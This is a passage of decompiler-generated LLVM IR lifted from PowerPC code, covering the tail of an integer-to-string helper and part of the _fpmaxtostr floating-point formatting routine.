  %v2_1000ca04 = add i32 %v2_1000c9fc, %v2_1000c9d4
  %v2_1000ca08 = mul i32 %v2_1000ca00, %v1_1000ca18
  %v2_1000ca0c = add i32 %v2_1000ca04, %v2_1000ca00
  store i32 %v2_1000ca0c, i32* %r6.global-to-local, align 4
  %v2_1000ca10 = sub i32 %v2_1000c9f8, %v2_1000ca08
  store i32 %v2_1000ca10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ca24

dec_label_pc_1000ca18:                            ; preds = %dec_label_pc_1000c9d0
  %v2_1000ca18 = mul i32 %v2_1000c9d4, %v1_1000ca18
  %v2_1000ca1c = sub i32 %v0_1000c9d4, %v2_1000ca18
  store i32 %v2_1000ca1c, i32* %r5.global-to-local, align 4
  store i32 %v2_1000c9d4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000ca24

dec_label_pc_1000ca24:                            ; preds = %dec_label_pc_1000c9dc, %dec_label_pc_1000ca18
  %v1_1000ca28 = phi i32 [ %v2_1000c9dc, %dec_label_pc_1000c9dc ], [ 0, %dec_label_pc_1000ca18 ]
  %v0_1000ca28 = phi i32 [ %v2_1000ca0c, %dec_label_pc_1000c9dc ], [ %v2_1000c9d4, %dec_label_pc_1000ca18 ]
  %v0_1000ca2c = phi i32 [ %v2_1000ca10, %dec_label_pc_1000c9dc ], [ %v2_1000ca1c, %dec_label_pc_1000ca18 ]
  %v2_1000ca28 = or i32 %v0_1000ca28, %v1_1000ca28
  %v5_1000ca28 = icmp eq i32 %v2_1000ca28, 0
  store i1 %v5_1000ca28, i1* %cr0_eq.global-to-local, align 1
  %v1_1000ca30 = load i32, i32* @r30, align 4
  %v0_1000ca34 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ca34 = add i32 %v0_1000ca34, -1
  store i32 %v1_1000ca34, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_1000ca2c, 10
  %v1_1000ca2c.v2_1000ca30.v = select i1 %tmp14, i32 48, i32 %v1_1000ca30
  %v1_1000ca2c.v2_1000ca30 = add i32 %v0_1000ca2c, %v1_1000ca2c.v2_1000ca30.v
  %extract.t9.extract.t = trunc i32 %v1_1000ca2c.v2_1000ca30 to i8
  %v3_1000ca44 = inttoptr i32 %v1_1000ca34 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_1000ca44, align 1
  %v0_1000ca48 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000ca48, label %dec_label_pc_1000ca4c, label %dec_label_pc_1000c9d0thread-pre-split

dec_label_pc_1000ca4c:                            ; preds = %dec_label_pc_1000ca24
  %v0_1000ca4c = load i32, i32* @r29, align 4
  %v3_1000ca4c = icmp eq i32 %v0_1000ca4c, 0
  br i1 %v3_1000ca4c, label %dec_label_pc_1000ca4c.dec_label_pc_1000ca5c_crit_edge, label %dec_label_pc_1000ca54

dec_label_pc_1000ca4c.dec_label_pc_1000ca5c_crit_edge: ; preds = %dec_label_pc_1000ca4c
  %v0_1000ca64.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ca5c

dec_label_pc_1000ca54:                            ; preds = %dec_label_pc_1000ca4c
  %v2_1000ca58 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000ca58 = add i32 %v2_1000ca58, -1
  %v4_1000ca58 = inttoptr i32 %v3_1000ca58 to i8*
  store i8 45, i8* %v4_1000ca58, align 1
  store i32 %v3_1000ca58, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ca5c

dec_label_pc_1000ca5c:                            ; preds = %dec_label_pc_1000ca4c.dec_label_pc_1000ca5c_crit_edge, %dec_label_pc_1000ca54
  %v0_1000ca64 = phi i32 [ %v0_1000ca64.pre, %dec_label_pc_1000ca4c.dec_label_pc_1000ca5c_crit_edge ], [ %v3_1000ca58, %dec_label_pc_1000ca54 ]
  ret i32 %v0_1000ca64

; uselistorder directives
  uselistorder i32 %v2_1000c9dc, { 1, 2, 0 }
  uselistorder i32 %v2_1000c9d4, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_1000ca18, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_1000c9b4, { 1, 2, 0 }
  uselistorder i32 %v0_1000c9b4, { 1, 0 }
  uselistorder i32 %v0_1000c970, { 1, 2, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000ca5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca24, { 1, 0 }
  uselistorder label %dec_label_pc_1000c9cc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c9a4, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_1000ca68 = load i32, i32* @lr, align 4
  store i32 %v0_1000ca68, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  store i32 %arg1, i32* %r27.global-to-local, align 4
  store i32 %arg3, i32* %r26.global-to-local, align 4
  %v1_1000ca84 = add i32 %tmp, 11
  %v2_1000ca84 = inttoptr i32 %v1_1000ca84 to i8*
  %v3_1000ca84 = load i8, i8* %v2_1000ca84, align 1
  %v4_1000ca84 = zext i8 %v3_1000ca84 to i32
  store i32 %v4_1000ca84, i32* %r31.global-to-local, align 4
  %v1_1000ca88 = or i32 %v4_1000ca84, 32
  %v1_1000ca8c = icmp ult i32 %v1_1000ca88, 97
  %v3_1000ca8c = icmp eq i32 %v1_1000ca88, 97
  store i1 %v1_1000ca8c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ca8c, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_1000ca98 = add i32 %tmp, 4
  %v2_1000ca98 = inttoptr i32 %v1_1000ca98 to i32*
  %v3_1000ca98 = load i32, i32* %v2_1000ca98, align 4
  store i32 %v3_1000ca98, i32* %r28.global-to-local, align 4
  %v2_1000ca9c = load i32, i32* %arg2, align 4
  store i32 %v2_1000ca9c, i32* %r30.global-to-local, align 4
  br i1 %v3_1000ca8c, label %dec_label_pc_1000caa4, label %dec_label_pc_1000caac

dec_label_pc_1000caa4:                            ; preds = %entry
  %v1_1000caa4 = add nuw nsw i32 %v4_1000ca84, 6
  store i32 %v1_1000caa4, i32* %r0.global-to-local, align 4
  %v1_1000caa8 = urem i32 %v1_1000caa4, 256
  store i32 %v1_1000caa8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000caac

dec_label_pc_1000caac:                            ; preds = %entry, %dec_label_pc_1000caa4
  %v0_1000cb60 = phi i32 [ %v4_1000ca84, %entry ], [ %v1_1000caa8, %dec_label_pc_1000caa4 ]
  %v1_1000caac = icmp slt i32 %v2_1000ca9c, 0
  %v3_1000caac = icmp eq i32 %v2_1000ca9c, 0
  store i1 %v1_1000caac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000caac, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_1000ca9c, -1
  br i1 %tmp75, label %dec_label_pc_1000cab8, label %dec_label_pc_1000cab4

dec_label_pc_1000cab4:                            ; preds = %dec_label_pc_1000caac
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000cab8

dec_label_pc_1000cab8:                            ; preds = %dec_label_pc_1000caac, %dec_label_pc_1000cab4
  %v0_1000cc7044 = phi i32 [ %v2_1000ca9c, %dec_label_pc_1000caac ], [ 6, %dec_label_pc_1000cab4 ]
  %v1_1000cab8 = add i32 %tmp, 12
  %v2_1000cab8 = inttoptr i32 %v1_1000cab8 to i32*
  %v3_1000cab8 = load i32, i32* %v2_1000cab8, align 4
  store i32 %v3_1000cab8, i32* %r9.global-to-local, align 4
  %v1_1000cabc = and i32 %v3_1000cab8, 2
  %v3_1000cabc = icmp eq i32 %v1_1000cabc, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_1000cabc, label %dec_label_pc_1000cad4, label %dec_label_pc_1000cae0

dec_label_pc_1000cad4:                            ; preds = %dec_label_pc_1000cab8
  %v1_1000cad4 = urem i32 %v3_1000cab8, 2
  store i32 %v1_1000cad4, i32* %r7.global-to-local, align 4
  %v3_1000cad4 = icmp eq i32 %v1_1000cad4, 0
  br i1 %v3_1000cad4, label %dec_label_pc_1000cae4, label %dec_label_pc_1000cae0

dec_label_pc_1000cae0:                            ; preds = %dec_label_pc_1000cad4, %dec_label_pc_1000cab8
  %storemerge = phi i32 [ 43, %dec_label_pc_1000cab8 ], [ 32, %dec_label_pc_1000cad4 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_1000cae0 = trunc i32 %storemerge to i8
  store i8 %v6_1000cae0, i8* %stack_var_-200, align 1
  br label %dec_label_pc_1000cae4

dec_label_pc_1000cae4:                            ; preds = %dec_label_pc_1000cad4, %dec_label_pc_1000cae0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000caac, label %dec_label_pc_1000cc48, label %dec_label_pc_1000cb60

dec_label_pc_1000cb60:                            ; preds = %dec_label_pc_1000cae4
  %v1_1000cb60 = icmp ult i32 %v0_1000cb60, 96
  %v2_1000cb60 = icmp ugt i32 %v0_1000cb60, 96
  %v3_1000cb60 = icmp eq i32 %v0_1000cb60, 96
  store i1 %v1_1000cb60, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cb60, i1* %cr7_eq.global-to-local, align 1
  %v2_1000cb68 = add i32 %tmp, 16
  %v3_1000cb68 = inttoptr i32 %v2_1000cb68 to i32*
  store i32 32, i32* %v3_1000cb68, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_1000cb60, label %dec_label_pc_1000cb8c, label %dec_label_pc_1000cb80

dec_label_pc_1000cb80:                            ; preds = %dec_label_pc_1000cb60
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000cb8c

dec_label_pc_1000cb8c:                            ; preds = %dec_label_pc_1000cb60, %dec_label_pc_1000cb80
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1000f980.239 to i32), i32 8), %dec_label_pc_1000cb60 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1000f980.239 to i32), i32 12), %dec_label_pc_1000cb80 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1000f980.239 to i32), i32* %r9.global-to-local, align 4
  %v2_1000cb98 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000cb98, i32* %r8.global-to-local, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d038

dec_label_pc_1000cc48:                            ; preds = %dec_label_pc_1000cae4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1000cc4c = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1000cc4c, i32* %r6.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_1000cc98 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_1000cc6c

dec_label_pc_1000cc6c:                            ; preds = %dec_label_pc_1000ccec.dec_label_pc_1000cc6c_crit_edge, %dec_label_pc_1000cc48
  %v0_1000cc70 = phi i32 [ %v0_1000cc70.pre, %dec_label_pc_1000ccec.dec_label_pc_1000cc6c_crit_edge ], [ %v0_1000cc7044, %dec_label_pc_1000cc48 ]
  %v3_1000cc70 = call %0 @__asm_cror(i32 %v0_1000cc70, i32 %tmp, i32 %v0_1000cc70)
  %v0_1000cc74 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000cc74, label %dec_label_pc_1000cc88, label %dec_label_pc_1000cc9c

dec_label_pc_1000cc88:                            ; preds = %dec_label_pc_1000cc6c
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000cc9c

dec_label_pc_1000cc9c:                            ; preds = %dec_label_pc_1000cc6c, %dec_label_pc_1000cc88
  %storemerge2 = phi i32 [ %v1_1000cc98, %dec_label_pc_1000cc88 ], [ %tmp55, %dec_label_pc_1000cc6c ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_1000ccac = load i32, i32* %r6.global-to-local, align 4
  %v1_1000ccac = add i32 %v0_1000ccac, 9
  store i32 %v1_1000ccac, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ccc8

dec_label_pc_1000ccc8:                            ; preds = %dec_label_pc_1000ccc8.dec_label_pc_1000ccc8_crit_edge, %dec_label_pc_1000cc9c
  %v1_1000ccd0 = phi i32 [ %v1_1000ccd0.pre, %dec_label_pc_1000ccc8.dec_label_pc_1000ccc8_crit_edge ], [ %v1_1000ccac, %dec_label_pc_1000cc9c ]
  %v0_1000cccc = phi i32 [ %v0_1000cccc.pre, %dec_label_pc_1000ccc8.dec_label_pc_1000ccc8_crit_edge ], [ 0, %dec_label_pc_1000cc9c ]
  %v1_1000ccc8 = phi i32 [ %v1_1000ccc8.pre, %dec_label_pc_1000ccc8.dec_label_pc_1000ccc8_crit_edge ], [ 10, %dec_label_pc_1000cc9c ]
  %v1_1000ccd8 = phi i32 [ %v0_1000ccc8.pre, %dec_label_pc_1000ccc8.dec_label_pc_1000ccc8_crit_edge ], [ %storemerge2, %dec_label_pc_1000cc9c ]
  %v2_1000ccc8 = udiv i32 %v1_1000ccd8, %v1_1000ccc8
  store i32 %v2_1000ccc8, i32* %r0.global-to-local, align 4
  %v1_1000cccc = add i32 %v0_1000cccc, 1
  store i32 %v1_1000cccc, i32* %r8.global-to-local, align 4
  %v2_1000ccd0 = sub i32 %v1_1000ccd0, %v1_1000cccc
  store i32 %v2_1000ccd0, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_1000ccc8, -10
  store i32 %v2_1000ccc8, i32* %r10.global-to-local, align 4
  %v2_1000ccd8 = add i32 %v1_1000ccd8, 48
  %v1_1000cce0 = add i32 %v2_1000ccd8, %tmp76
  store i32 %v1_1000cce0, i32* %r9.global-to-local, align 4
  %v1_1000cce4 = trunc i32 %v1_1000cce0 to i8
  %v3_1000cce4 = inttoptr i32 %v2_1000ccd0 to i8*
  store i8 %v1_1000cce4, i8* %v3_1000cce4, align 1
  %v0_1000cce8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000cce8 = add i32 %v0_1000cce8, -1
  store i32 %v1_1000cce8, i32* %ctr.global-to-local, align 4
  %v2_1000cce8 = icmp eq i32 %v1_1000cce8, 0
  br i1 %v2_1000cce8, label %dec_label_pc_1000ccec, label %dec_label_pc_1000ccc8.dec_label_pc_1000ccc8_crit_edge

dec_label_pc_1000ccc8.dec_label_pc_1000ccc8_crit_edge: ; preds = %dec_label_pc_1000ccc8
  %v0_1000ccc8.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ccc8.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000cccc.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000ccd0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000ccc8

dec_label_pc_1000ccec:                            ; preds = %dec_label_pc_1000ccc8
  %v0_1000ccec = load i32, i32* %r7.global-to-local, align 4
  %v1_1000ccec = icmp slt i32 %v0_1000ccec, 0
  %v3_1000ccec = icmp eq i32 %v0_1000ccec, 0
  store i1 %v1_1000ccec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ccec, i1* %cr7_eq.global-to-local, align 1
  %v1_1000ccf0 = add i32 %v0_1000ccec, 1
  store i32 %v1_1000ccf0, i32* %r7.global-to-local, align 4
  br i1 %v3_1000ccec, label %dec_label_pc_1000ccec.dec_label_pc_1000cc6c_crit_edge, label %dec_label_pc_1000ccf8

dec_label_pc_1000ccec.dec_label_pc_1000cc6c_crit_edge: ; preds = %dec_label_pc_1000ccec
  %v0_1000cc70.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000cc6c

dec_label_pc_1000ccf8:                            ; preds = %dec_label_pc_1000ccec
  %v0_1000ccf8 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ccf8 = icmp ult i32 %v0_1000ccf8, 96
  %v2_1000ccf8 = icmp ugt i32 %v0_1000ccf8, 96
  %v3_1000ccf8 = icmp eq i32 %v0_1000ccf8, 96
  store i1 %v1_1000ccf8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ccf8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000ccf8, label %dec_label_pc_1000cd10, label %dec_label_pc_1000cd00

dec_label_pc_1000cd00:                            ; preds = %dec_label_pc_1000ccf8
  %v1_1000cd08 = add i32 %v0_1000ccf8, 32
  store i32 %v1_1000cd08, i32* %r0.global-to-local, align 4
  %v1_1000cd0c = urem i32 %v1_1000cd08, 256
  store i32 %v1_1000cd0c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cd10

dec_label_pc_1000cd10:                            ; preds = %dec_label_pc_1000ccf8, %dec_label_pc_1000cd00
  %v0_1000cd28 = phi i32 [ %v1_1000cd0c, %dec_label_pc_1000cd00 ], [ %v0_1000ccf8, %dec_label_pc_1000ccf8 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_1000cd00 ], [ 101, %dec_label_pc_1000ccf8 ]
  %v1_1000cd10 = icmp slt i32 %v0_1000cd28, 103
  %v3_1000cd10 = icmp eq i32 %v0_1000cd28, 103
  store i1 %v1_1000cd10, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cd10, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cd10, label %dec_label_pc_1000cd18, label %dec_label_pc_1000cd28

dec_label_pc_1000cd18:                            ; preds = %dec_label_pc_1000cd10
  %v0_1000cd18 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000cd18 = icmp slt i32 %v0_1000cd18, 0
  %v3_1000cd18 = icmp eq i32 %v0_1000cd18, 0
  store i1 %v1_1000cd18, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cd18, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cd18, label %dec_label_pc_1000cd30, label %dec_label_pc_1000cd20

dec_label_pc_1000cd20:                            ; preds = %dec_label_pc_1000cd18
  %v1_1000cd20 = add i32 %v0_1000cd18, -1
  store i32 %v1_1000cd20, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000cd30

dec_label_pc_1000cd28:                            ; preds = %dec_label_pc_1000cd10
  %v1_1000cd28 = icmp slt i32 %v0_1000cd28, 102
  %v3_1000cd28 = icmp eq i32 %v0_1000cd28, 102
  store i1 %v1_1000cd28, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cd28, i1* %cr7_eq.global-to-local, align 1
  %v0_1000cd38 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_1000cd28, label %dec_label_pc_1000cd38, label %dec_label_pc_1000cd30

dec_label_pc_1000cd30:                            ; preds = %dec_label_pc_1000cd28, %dec_label_pc_1000cd18, %dec_label_pc_1000cd20
  %v0_1000cd30 = phi i32 [ 0, %dec_label_pc_1000cd18 ], [ %v1_1000cd20, %dec_label_pc_1000cd20 ], [ %v0_1000cd38, %dec_label_pc_1000cd28 ]
  store i32 %v0_1000cd30, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000cd5c

dec_label_pc_1000cd38:                            ; preds = %dec_label_pc_1000cd28
  %v1_1000cd38 = load i32, i32* %r4.global-to-local, align 4
  %v2_1000cd38 = add i32 %v1_1000cd38, %v0_1000cd38
  store i32 %v2_1000cd38, i32* %r10.global-to-local, align 4
  %v1_1000cd3c = icmp slt i32 %v2_1000cd38, -1
  %v3_1000cd3c = icmp eq i32 %v2_1000cd38, -1
  store i1 %v1_1000cd3c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cd3c, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_1000cd38, -2
  br i1 %tmp77, label %dec_label_pc_1000cd5c, label %dec_label_pc_1000cd44

dec_label_pc_1000cd44:                            ; preds = %dec_label_pc_1000cd38
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_1000cd48 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_1000cd48, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268488020, i32* @lr, align 4
  %v3_1000cd50 = call i32 @__GI_memset(i32 %v2_1000cd48, i32 48, i32 17)
  store i32 %v3_1000cd50, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000cd5c

dec_label_pc_1000cd5c:                            ; preds = %dec_label_pc_1000cd38, %dec_label_pc_1000cd30, %dec_label_pc_1000cd44
  %v1_1000cd80 = phi i32 [ %v2_1000cd38, %dec_label_pc_1000cd38 ], [ %v0_1000cd30, %dec_label_pc_1000cd30 ], [ -1, %dec_label_pc_1000cd44 ]
  %v1_1000cd5c = icmp slt i32 %v1_1000cd80, 16
  %v2_1000cd5c = icmp sgt i32 %v1_1000cd80, 16
  %v3_1000cd5c = icmp eq i32 %v1_1000cd80, 16
  store i1 %v1_1000cd5c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cd5c, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_1000cd70 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_1000cd70, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_1000cd5c, label %dec_label_pc_1000cd98, label %dec_label_pc_1000cd7c

dec_label_pc_1000cd7c:                            ; preds = %dec_label_pc_1000cd5c
  %v2_1000cd7c = ptrtoint i32* %stack_var_-177 to i32
  %v2_1000cd80 = add i32 %v1_1000cd80, %v2_1000cd7c
  store i32 %v2_1000cd80, i32* %r9.global-to-local, align 4
  %v1_1000cd84 = add i32 %v2_1000cd80, 2
  %v2_1000cd84 = inttoptr i32 %v1_1000cd84 to i8*
  %v3_1000cd84 = load i8, i8* %v2_1000cd84, align 1
  %v4_1000cd84 = zext i8 %v3_1000cd84 to i32
  store i32 %v4_1000cd84, i32* %r0.global-to-local, align 4
  store i32 %v1_1000cd84, i32* %r11.global-to-local, align 4
  %v1_1000cd8c = sub nsw i32 52, %v4_1000cd84
  %v2_1000cd8c = sub nuw nsw i32 -1, %v4_1000cd84
  %not.v5_1000cd8c = icmp ugt i32 %v1_1000cd8c, %v2_1000cd8c
  %v1_1000cd94 = zext i1 %not.v5_1000cd8c to i32
  store i32 %v1_1000cd94, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000cd98

dec_label_pc_1000cd98:                            ; preds = %dec_label_pc_1000cd5c, %dec_label_pc_1000cd7c, %dec_label_pc_1000cd98.backedge
  %v0_1000cd9c = phi i32 [ %v0_1000cd9c.pre, %dec_label_pc_1000cd98.backedge ], [ 0, %dec_label_pc_1000cd5c ], [ %v1_1000cd94, %dec_label_pc_1000cd7c ]
  %v0_1000cd98 = phi i32 [ %v0_1000cd98.pre, %dec_label_pc_1000cd98.backedge ], [ %v2_1000cd70, %dec_label_pc_1000cd5c ], [ %v1_1000cd84, %dec_label_pc_1000cd7c ]
  %v1_1000cd98 = add i32 %v0_1000cd98, -1
  %v2_1000cd98 = inttoptr i32 %v1_1000cd98 to i8*
  %v3_1000cd98 = load i8, i8* %v2_1000cd98, align 1
  %v4_1000cd98 = zext i8 %v3_1000cd98 to i32
  store i32 %v1_1000cd98, i32* %r11.global-to-local, align 4
  %v2_1000cd9c = add i32 %v4_1000cd98, %v0_1000cd9c
  store i32 %v2_1000cd9c, i32* %r0.global-to-local, align 4
  %v1_1000cda0 = urem i32 %v2_1000cd9c, 256
  store i32 %v1_1000cda0, i32* %r9.global-to-local, align 4
  %v1_1000cda4 = trunc i32 %v2_1000cd9c to i8
  store i8 %v1_1000cda4, i8* %v2_1000cd98, align 1
  %v0_1000cda8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cda8 = icmp slt i32 %v0_1000cda8, 48
  %v3_1000cda8 = icmp eq i32 %v0_1000cda8, 48
  store i1 %v1_1000cda8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cda8, i1* %cr7_eq.global-to-local, align 1
  %v1_1000cdac = icmp ult i32 %v0_1000cda8, 57
  %v2_1000cdac = icmp ugt i32 %v0_1000cda8, 57
  %v3_1000cdac = icmp eq i32 %v0_1000cda8, 57
  store i1 %v1_1000cdac, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000cdac, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000cdac, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000cda8, %v2_1000cdac
  br i1 %brmerge, label %dec_label_pc_1000cd98.backedge, label %dec_label_pc_1000cdb8

dec_label_pc_1000cd98.backedge:                   ; preds = %dec_label_pc_1000cd98
  %v0_1000cd98.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000cd9c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000cd98

dec_label_pc_1000cdb8:                            ; preds = %dec_label_pc_1000cd98
  %v2_1000cdb8 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_1000cdb8, i32* %r0.global-to-local, align 4
  %v0_1000cdbc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1000cdbc, i32* %r7.global-to-local, align 4
  %v0_1000cdc0 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000cdc0 = icmp ult i32 %v0_1000cdc0, %v2_1000cdb8
  %v3_1000cdc0 = icmp ugt i32 %v0_1000cdc0, %v2_1000cdb8
  %v4_1000cdc0 = icmp eq i32 %v0_1000cdc0, %v2_1000cdb8
  store i1 %v2_1000cdc0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000cdc0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_1000cc4c, i32* %r8.global-to-local, align 4
  br i1 %v3_1000cdc0, label %dec_label_pc_1000cdd8, label %dec_label_pc_1000cdcc

dec_label_pc_1000cdcc:                            ; preds = %dec_label_pc_1000cdb8
  store i32 %v2_1000cdb8, i32* %r8.global-to-local, align 4
  %v1_1000cdd0 = add i32 %v0_1000cdbc, 1
  store i32 %v1_1000cdd0, i32* %r7.global-to-local, align 4
  store i32 %v2_1000cdb8, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000cdd8

dec_label_pc_1000cdd8:                            ; preds = %dec_label_pc_1000cdb8, %dec_label_pc_1000cdcc
  %v2_1000cde0 = phi i32 [ %v0_1000cdc0, %dec_label_pc_1000cdb8 ], [ %v2_1000cdb8, %dec_label_pc_1000cdcc ]
  %v0_1000cdd8 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000cdd8 = icmp slt i32 %v0_1000cdd8, 103
  %v3_1000cdd8 = icmp eq i32 %v0_1000cdd8, 103
  store i1 %v1_1000cdd8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cdd8, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
